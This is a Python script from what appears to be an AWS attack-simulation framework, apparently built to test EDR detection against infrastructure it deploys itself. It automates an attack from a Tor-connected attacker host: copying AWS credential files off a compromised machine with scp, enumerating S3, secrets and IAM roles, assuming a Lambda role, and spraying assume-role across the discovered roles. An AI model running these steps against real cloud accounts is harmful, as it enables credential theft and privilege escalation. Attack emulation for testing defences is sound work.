import os
import sys
import re
import pyfiglet
import time
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored

from core.helpers import loading_animation, generate_ssh_key, upload_file_to_server, run_subprocess

CONNECTIVITY_CHECK_INTERVAL = 60  # In seconds
MAX_CONNECTIVITY_WAIT_TIME = 60 * 10


class ScenarioExecution:

    def __init__(self):
        self.agent_included = None
        self.compromised_ec2_external_ip = None
        self.attacker_ec2_external_ip = None
        self.lambda_role_arn = None
        self.compromised_ec2_key = "./compromised_id_rsa"
        self.attacker_ec2_key = "./attacker_id_rsa"
        self.attacker_env_vars = {}

        self.discovered_roles = []

    def read_pulumi_config(self):
        with open("./core/cobra-scenario-8-output.json", "r") as file:
            data = json.load(file)

        self.agent_included = data['Agent Included']
        self.attacker_ec2_external_ip = data['Attacker Server Public IP']
        self.lambda_role_arn = data['Lambda Role ARN']

        if self.agent_included:
            self.compromised_ec2_external_ip = data['Compromised Server Public IP']
        else:
            self.attacker_env_vars['AWS_ACCESS_KEY_ID'] = data['Dev Access Key ID']
            self.attacker_env_vars['AWS_SECRET_ACCESS_KEY'] = data['Dev Access Key Secret']
            self.attacker_env_vars['AWS_REGION'] = data['Region']

    def init_infra(self):
        file_path = "./core/cobra-scenario-8-output.json"
        if os.path.exists(file_path):
            os.remove(file_path)
            print("File '{}' found and deleted.".format(file_path))
        else:
            print("File '{}' not found.".format(file_path))

        generate_ssh_key(self.compromised_ec2_key)
        generate_ssh_key(self.attacker_ec2_key)

        run_subprocess("cd ./scenarios/scenario_8/infra/ && pulumi up -s cobra-scenario-8 -y")
        run_subprocess(
            "cd ./scenarios/scenario_8/infra/ && pulumi stack -s cobra-scenario-8 output --json --show-secrets >> ../../../core/cobra-scenario-8-output.json"
        )

        # TODO: Move config read and members init into seperate function
        self.read_pulumi_config()

    def check_agent_connected(self):
        cmdline = f'ssh -o StrictHostKeyChecking=no -i {self.compromised_ec2_key} ubuntu@{self.compromised_ec2_external_ip} "sudo /opt/traps/bin/cytool status"'
        output = run_subprocess(cmdline, return_output=True, check=False)
        edr_state = re.search(r"\nEDR\s+\w+\s+(\w+)\s+", output)
        if edr_state:
            edr_state = edr_state.group(1)

        return edr_state == "Enabled"

    def wait_for_agent(self):
        agent_connected = False
        time_waited = 0
        while not agent_connected:
            if time_waited > MAX_CONNECTIVITY_WAIT_TIME:
                print(colored(f"Agent did not connect for too long (timed out), aborting...", color="red"))
                exit(1)

            time.sleep(CONNECTIVITY_CHECK_INTERVAL)
            time_waited += CONNECTIVITY_CHECK_INTERVAL
            agent_connected = self.check_agent_connected()

        print(colored("Agent connected!", color="green"))

    def attacker_run(self, cmdline, return_output=False):
        # Build the export string from the class state
        env_prefix = ""
        if self.attacker_env_vars:
            # Creates: "export KEY='VAL'; export KEY2='VAL2'; "
            env_prefix = " ".join([f"export {k}='{v}';" for k, v in self.attacker_env_vars.items()]) + " "

        # Prepend it to the user's command
        full_remote_cmd = f"{env_prefix}{cmdline}"

        escaped_cmd = full_remote_cmd.replace('"', '\\"')

        # Construct the SSH wrapper
        nested_cmdline = f'ssh -o StrictHostKeyChecking=no -i {self.attacker_ec2_key} ubuntu@{self.attacker_ec2_external_ip} "{escaped_cmd}"'

        result = run_subprocess(nested_cmdline, return_output=return_output, check=False)
        return result

    def wait_for_attacker(self):
        tor_status_cmdline = "cat /home/ubuntu/tor_status.txt | grep successful"

        tor_connected = self.attacker_run(tor_status_cmdline) == 0
        time_waited = 0
        while not tor_connected:
            if time_waited > MAX_CONNECTIVITY_WAIT_TIME:
                print(colored(f"Attacker machine did not initialize for too long (timed out), aborting...",
                              color="red"))
                exit(1)
            sleep(CONNECTIVITY_CHECK_INTERVAL)
            time_waited += CONNECTIVITY_CHECK_INTERVAL
            tor_connected = self.attacker_run(tor_status_cmdline) == 0

    def attempt_recon(self):
        # List buckets
        result = self.attacker_run("aws s3 ls")
        print(colored(f"S3 enumeration attempt result: error_code={result}", "red"))

        # List secrets
        result = self.attacker_run("aws secretsmanager list-secrets")
        print(colored(f"Secrets enumeration attempt result: error_code={result}", "red"))

        # List roles
        result = self.attacker_run('aws iam list-roles | jq ".Roles[].Arn"', return_output=True)
        self.discovered_roles = [arn.strip('"') for arn in result.split()]
        print(colored(f"IAM roles enumeration attempt result: {result}", "red"))

    def attacker_assume_role(self, role_arn, session_name="DebuggingSession", update_env=True, check=True):
        print(colored(f"Attempting to assume role: {role_arn}...", "yellow"))

        cmd = f"aws sts assume-role --role-arn {role_arn} --role-session-name {session_name} --output json"
        output = self.attacker_run(cmd, return_output=True)

        try:
            credentials = json.loads(output)['Credentials']

            # Update the class state
            if update_env:
                self.attacker_env_vars['AWS_ACCESS_KEY_ID'] = credentials['AccessKeyId']
                self.attacker_env_vars['AWS_SECRET_ACCESS_KEY'] = credentials['SecretAccessKey']
                self.attacker_env_vars['AWS_SESSION_TOKEN'] = credentials['SessionToken']
                print(colored("Environment updated.", "red"))

            print(colored(f"Successfully assumed role!", "red"))

        except (json.JSONDecodeError, KeyError) as e:
            print(colored(f"Failed to assume-role", "red"))
            # Ensure success if check flag is supplied
            if check:
                raise e

    def attempt_backdoor(self):
        # Create new user

        # Attach admin policy

        # Create password/key for user
        pass

    def scenario_8_execute(self):

        # Init
        print("-" * 30)
        print(colored("Executing Scenraio 8 : AWS Persistence Privileges Escalation", color="red"))
        loading_animation()
        print("-" * 30)

        print(colored("Rolling out Infra", color="red"))
        loading_animation()
        print("-" * 30)

        self.init_infra()
        print(colored("Infra deployed!", color="red"))

        print(colored("Waiting for attacker's machine to initialize...", color="red"))
        self.wait_for_attacker()

        if self.agent_included:
            print(colored("Waiting for compromised machine with agent to initialize...", color="red"))
            self.wait_for_agent()

            # Upload compromised SSH key to attacker's machine - Scenario with agent begins with the attackers having their hands on this SSH key
            print(colored("Uploading compromised machine SSH key onto attacker's machine", color="red"))
            upload_result = upload_file_to_server(self.compromised_ec2_key,
                                                  "ubuntu",
                                                  self.attacker_ec2_external_ip,
                                                  "/home/ubuntu/",
                                                  key_path="./attacker_id_rsa")

            # Local AWS CLI credentials are exfilterated onto attacker's machine
            self.attacker_run(
                f"scp -i compromised_id_rsa ubuntu@{self.compromised_ec2_external_ip}:~/.aws/credentials ./.aws/credentials"
            )
            self.attacker_run(
                f"scp -i compromised_id_rsa ubuntu@{self.compromised_ec2_external_ip}:~/.aws/config ./.aws/config")

        else:
            print(colored("Agent not included in the scenario, procceeding...", color="yellow"))
            # Without agent the scenario begins with the attackers using the compromised dev user AWS CLI credentials

        # Recon attempts will fail since initial compromised user has low privileges
        self.attempt_recon()

        # Assume lambda role
        self.attacker_assume_role(self.lambda_role_arn)

        # AssumeRole spray
        if self.discovered_roles:
            print(colored(f"Spraying {len(self.discovered_roles)} discovered roles...", "red"))

            for role_arn in tqdm(self.discovered_roles):
                self.attacker_assume_role(role_arn, update_env=False, check=False)

    def post_execution(self):
        pass
